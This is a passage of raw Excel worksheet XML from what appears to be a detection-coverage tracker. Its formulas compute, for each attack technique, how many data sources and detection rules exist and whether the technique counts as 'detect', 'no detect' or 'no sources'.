        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S45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51" t="s">
        <v>425</v>
      </c>
      <c r="U451" t="s">
        <v>2191</v>
      </c>
      <c r="V451" t="s">
        <v>2192</v>
      </c>
      <c r="W451" t="b">
        <v>1</v>
      </c>
      <c r="X451" t="s">
        <v>2185</v>
      </c>
    </row>
    <row r="452" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A452" t="s">
        <v>2185</v>
      </c>
      <c r="B452" t="s">
        <v>2193</v>
      </c>
      <c r="C452" t="s">
        <v>2194</v>
      </c>
      <c r="D452" t="s">
        <v>13</v>
      </c>
      <c r="E452" t="s">
        <v>2186</v>
      </c>
      <c r="F452" s="9">
        <f t="shared" si="7"/>
        <v>5</v>
      </c>
      <c r="G452" s="9" cm="1">
        <f t="array" ref="G452">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>3</v>
      </c>
      <c r="H452" s="9" t="str" cm="1">
        <f t="array" ref="H452">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I452" s="9" t="str" cm="1">
        <f t="array" ref="I452">IF(SUM(IF($C452=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C452=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J452" s="9" t="str" cm="1">
        <f t="array" ref="J45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52" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M452" s="9" cm="1">
        <f t="array" ref="M452">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N452" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O452" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P452" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S45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52" t="s">
        <v>425</v>
      </c>
      <c r="U452" t="s">
        <v>2195</v>
      </c>
      <c r="V452" t="s">
        <v>2196</v>
      </c>
      <c r="W452" t="b">
        <v>1</v>
      </c>
      <c r="X452" t="s">
        <v>2185</v>
      </c>
    </row>
    <row r="453" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A453" t="s">
        <v>2197</v>
      </c>
      <c r="B453" t="s">
        <v>2197</v>
      </c>
      <c r="C453" t="s">
        <v>166</v>
      </c>
      <c r="D453" t="s">
        <v>6</v>
      </c>
      <c r="E453" t="s">
        <v>2198</v>
      </c>
      <c r="F453" s="9">
        <f t="shared" si="7"/>
        <v>18</v>
      </c>
      <c r="G453" s="9" cm="1">
        <f t="array" ref="G453">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H453" s="9" cm="1">
        <f t="array" ref="H453">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v>11</v>
      </c>
      <c r="I453" s="9" t="str" cm="1">
        <f t="array" ref="I453">IF(SUM(IF($C453=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C453=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J453" s="9" cm="1">
        <f t="array" ref="J45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453" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>11</v>
      </c>
      <c r="M453" s="9" cm="1">
        <f t="array" ref="M453">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>11</v>
      </c>
      <c r="N453" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O453" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P453" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S45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53" t="s">
        <v>2199</v>
      </c>
      <c r="U453" t="s">
        <v>2200</v>
      </c>
      <c r="V453" t="s">
        <v>2201</v>
      </c>
      <c r="W453" t="b">
        <v>0</v>
      </c>
    </row>
    <row r="454" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A454" t="s">
        <v>2197</v>
      </c>
      <c r="B454" t="s">
        <v>2202</v>
      </c>
      <c r="C454" t="s">
        <v>258</v>
      </c>
      <c r="D454" t="s">
        <v>6</v>
      </c>
      <c r="E454" t="s">
        <v>2203</v>
      </c>
      <c r="F454" s="9">
        <f t="shared" si="7"/>
        <v>8</v>
      </c>
      <c r="G454" s="9" cm="1">
        <f t="array" ref="G454">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H454" s="9" t="str" cm="1">
        <f t="array" ref="H454">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I454" s="9" t="str" cm="1">
        <f t="array" ref="I454">IF(SUM(IF($C454=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C454=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J454" s="9" t="str" cm="1">
        <f t="array" ref="J45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54" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M454" s="9" cm="1">
        <f t="array" ref="M454">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N454" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O454" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P454" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S45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54" t="s">
        <v>686</v>
      </c>
      <c r="U454" t="s">
        <v>2204</v>
      </c>
      <c r="V454" t="s">
        <v>2205</v>
      </c>
      <c r="W454" t="b">
        <v>1</v>
      </c>
      <c r="X454" t="s">
        <v>2197</v>
      </c>
    </row>
    <row r="455" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A455" t="s">
        <v>2197</v>
      </c>
      <c r="B455" t="s">
        <v>2206</v>
      </c>
      <c r="C455" t="s">
        <v>254</v>
      </c>
      <c r="D455" t="s">
        <v>6</v>
      </c>
      <c r="E455" t="s">
        <v>2207</v>
      </c>
      <c r="F455" s="9">
        <f t="shared" si="7"/>
        <v>7</v>
      </c>
      <c r="G455" s="9" cm="1">
        <f t="array" ref="G455">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H455" s="9" t="str" cm="1">
        <f t="array" ref="H455">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I455" s="9" t="str" cm="1">
        <f t="array" ref="I455">IF(SUM(IF($C455=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C455=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J455" s="9" t="str" cm="1">
        <f t="array" ref="J45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55" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M455" s="9" cm="1">
        <f t="array" ref="M455">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N455" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O455" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P455" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S45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55" t="s">
        <v>386</v>
      </c>
      <c r="U455" t="s">
        <v>2208</v>
      </c>
      <c r="V455" t="s">
        <v>2209</v>
      </c>
      <c r="W455" t="b">
        <v>1</v>
      </c>
      <c r="X455" t="s">
        <v>2197</v>
      </c>
    </row>
    <row r="456" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A456" t="s">
        <v>2197</v>
      </c>
      <c r="B456" t="s">
        <v>2210</v>
      </c>
      <c r="C456" t="s">
        <v>2211</v>
      </c>
      <c r="D456" t="s">
        <v>6</v>
      </c>
      <c r="E456" t="s">
        <v>2212</v>
      </c>
      <c r="F456" s="9">
        <f t="shared" si="7"/>
        <v>2</v>
      </c>
      <c r="G456" s="9" cm="1">
        <f t="array" ref="G456">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H456" s="9" t="str" cm="1">
        <f t="array" ref="H456">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I456" s="9" t="str" cm="1">
        <f t="array" ref="I456">IF(SUM(IF($C456=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C456=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J456" s="9" t="str" cm="1">
        <f t="array" ref="J45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56" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M456" s="9" cm="1">
        <f t="array" ref="M456">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N456" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O456" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P456" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S45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56" t="s">
        <v>425</v>
      </c>
      <c r="U456" t="s">
        <v>2213</v>
      </c>
      <c r="V456" t="s">
        <v>2214</v>
      </c>
      <c r="W456" t="b">
        <v>1</v>
      </c>
      <c r="X456" t="s">
        <v>2197</v>
      </c>
    </row>
    <row r="457" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A457" t="s">
        <v>2197</v>
      </c>
      <c r="B457" t="s">
        <v>2215</v>
      </c>
      <c r="C457" t="s">
        <v>2216</v>
      </c>
      <c r="D457" t="s">
        <v>6</v>
      </c>
      <c r="E457" t="s">
        <v>2217</v>
      </c>
      <c r="F457" s="9">
        <f t="shared" si="7"/>
        <v>4</v>
      </c>
      <c r="G457" s="9" cm="1">
        <f t="array" ref="G457">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H457" s="9" t="str" cm="1">
        <f t="array" ref="H457">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I457" s="9" t="str" cm="1">
        <f t="array" ref="I457">IF(SUM(IF($C457=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C457=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J457" s="9" t="str" cm="1">
        <f t="array" ref="J45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57" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M457" s="9" cm="1">
        <f t="array" ref="M457">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N457" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O457" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P457" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S45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57" t="s">
        <v>425</v>
      </c>
      <c r="U457" t="s">
        <v>2218</v>
      </c>
      <c r="V457" t="s">
        <v>2219</v>
      </c>
      <c r="W457" t="b">
        <v>1</v>
      </c>
      <c r="X457" t="s">
        <v>2197</v>
      </c>
    </row>
    <row r="458" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A458" t="s">
        <v>2197</v>
      </c>
      <c r="B458" t="s">
        <v>2220</v>
      </c>
      <c r="C458" t="s">
        <v>2221</v>
      </c>
      <c r="D458" t="s">
        <v>6</v>
      </c>
      <c r="E458" t="s">
        <v>2222</v>
      </c>
      <c r="F458" s="9">
        <f t="shared" si="7"/>
        <v>4</v>
      </c>
      <c r="G458" s="9" cm="1">
        <f t="array" ref="G458">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>1</v>
      </c>
      <c r="H458" s="9" t="str" cm="1">
        <f t="array" ref="H458">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I458" s="9" t="str" cm="1">
        <f t="array" ref="I458">IF(SUM(IF($C458=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C458=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J458" s="9" t="str" cm="1">
        <f t="array" ref="J45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58" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M458" s="9" cm="1">
        <f t="array" ref="M458">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N458" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O458" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P458" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no detect</v>
      </c>
      <c r="S45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58" t="s">
        <v>368</v>
      </c>
      <c r="U458" t="s">
        <v>2223</v>
      </c>
      <c r="V458" t="s">
        <v>2224</v>
      </c>
      <c r="W458" t="b">
        <v>1</v>
      </c>
      <c r="X458" t="s">
        <v>2197</v>
      </c>
    </row>
    <row r="459" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A459" t="s">
        <v>2197</v>
      </c>
      <c r="B459" t="s">
        <v>2225</v>
      </c>
      <c r="C459" t="s">
        <v>282</v>
      </c>
      <c r="D459" t="s">
        <v>6</v>
      </c>
      <c r="E459" t="s">
        <v>2226</v>
      </c>
      <c r="F459" s="9">
        <f t="shared" si="7"/>
        <v>2</v>
      </c>
      <c r="G459" s="9" cm="1">
        <f t="array" ref="G459">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H459" s="9" t="str" cm="1">
        <f t="array" ref="H459">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I459" s="9" t="str" cm="1">
        <f t="array" ref="I459">IF(SUM(IF($C459=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C459=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J459" s="9" t="str" cm="1">
        <f t="array" ref="J45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59" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M459" s="9" cm="1">
        <f t="array" ref="M459">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N459" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O459" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P459" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S45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59" t="s">
        <v>520</v>
      </c>
      <c r="U459" t="s">
        <v>2227</v>
      </c>
      <c r="V459" t="s">
        <v>2228</v>
      </c>
      <c r="W459" t="b">
        <v>1</v>
      </c>
      <c r="X459" t="s">
        <v>2197</v>
      </c>
    </row>
    <row r="460" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A460" t="s">
        <v>2197</v>
      </c>
      <c r="B460" t="s">
        <v>2229</v>
      </c>
      <c r="C460" t="s">
        <v>256</v>
      </c>
      <c r="D460" t="s">
        <v>6</v>
      </c>
      <c r="E460" t="s">
        <v>2230</v>
      </c>
      <c r="F460" s="9">
        <f t="shared" si="7"/>
        <v>3</v>
      </c>
      <c r="G460" s="9" cm="1">
        <f t="array" ref="G460">SUM(IF(ISERROR(FIND(Sources[Data Source],Techniques[[#This Row],[Data Sources]])),0,1)*IF(Sources[Available]="yes",1,0))</f>
        <v>0</v>
      </c>
      <c r="H460" s="9" t="str" cm="1">
        <f t="array" ref="H460">IF(Techniques[[#This Row],[Technique]]=Techniques[[#This Row],[ID]],SUM(IF(Techniques[[#This Row],[ID]]=Techniques[Technique],1,0))-1,"")</f>
        <v/>
      </c>
      <c r="I460" s="9" t="str" cm="1">
        <f t="array" ref="I460">IF(SUM(IF($C460=Detections[],IF(Detections[Is Active]="yes",1,0),0))&gt;0,SUM(IF($C460=Detections[],IF(Detections[Is Active]="yes",1,0),0)),"")</f>
        <v/>
      </c>
      <c r="J460" s="9" t="str" cm="1">
        <f t="array" ref="J46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60" s="9">
        <f>IF(AND(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;1),Techniques[No. of Sub Techniques],1)</f>
        <v>1</v>
      </c>
      <c r="M460" s="9" cm="1">
        <f t="array" ref="M460">Techniques[[#This Row],[Min. Detection Rules]]+IF(IF(ISNUMBER(Techniques[[#This Row],[No. of Sub Techniques]]),Techniques[[#This Row],[No. of Sub Techniques]]&gt;0,FALSE),SUM(IF(Techniques[[#This Row],[Technique]]=Techniques[Technique],Techniques[Detection Rules Modifier],0)),Techniques[[#This Row],[Detection Rules Modifier]])</f>
        <v>1</v>
      </c>
      <c r="N460" s="9">
        <f>IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for Technique]]),Techniques[[#This Row],[Detection Rules for Technique]],0)+IF(ISNUMBER(Techniques[[#This Row],[Detection Rules for SubTech]]),Techniques[[#This Row],[Detection Rules for SubTech]],0)</f>
        <v>0</v>
      </c>
      <c r="O460" s="14">
        <f>IF(Techniques[[#This Row],[Detection Rules]]&gt;=Techniques[[#This Row],[Expected Detection Rules]],1,Techniques[[#This Row],[Detection Rules]]/Techniques[[#This Row],[Expected Detection Rules]])</f>
        <v>0</v>
      </c>
      <c r="P460" s="14" t="str">
        <f>IF(Techniques[[#This Row],[Expected Detection Rules]]&lt;=0,"disabled",IF(Techniques[[#This Row],[Data Sources Available]]&gt;0, IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"detect","no detect"),IF(Techniques[[#This Row],[Detection Rules]]&gt;0,"inconsistent","no sources")))</f>
        <v>no sources</v>
      </c>
      <c r="S46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60" t="s">
        <v>517</v>
      </c>
      <c r="U460" t="s">
        <v>2231</v>
      </c>
      <c r="V460" t="s">
        <v>2232</v>
      </c>
      <c r="W460" t="b">
        <v>1</v>
      </c>
      <c r="X460" t="s">
        <v>2197</v>
      </c>
    </row>
    <row r="461" spans="1:24" ht="14.4" x14ac:dyDescent="0.3">
      <c r="A461" t="s">
        <v>2197</v>
      </c>
      <c r="B461" t="s">
        <v>2233</v>
      </c>
      <c r="C461" t="s">
        <v>2234</v>
      </c>
      <c r="D461" t="s">
        <v>6</v>
      </c>
      <c r="E461" t="s">
        <v>1904</v>
      </c>
      <c r="F461" s="9">
        <f t="shared" si="7"/>
        <v>4</v>
      </c>
      <c r="G461" s="9" cm="1">
